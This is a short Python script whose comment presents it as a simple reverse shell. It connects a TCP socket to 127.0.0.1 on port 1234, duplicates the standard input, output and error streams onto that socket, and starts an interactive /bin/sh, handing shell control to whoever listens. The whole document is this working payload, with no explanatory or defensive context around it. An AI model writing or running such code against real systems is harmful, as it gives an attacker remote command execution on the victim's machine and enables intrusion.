# this is a simple program that creates a reverse shell in python 

import socket 
import subprocess
import os 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); 
s.connect(("127.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
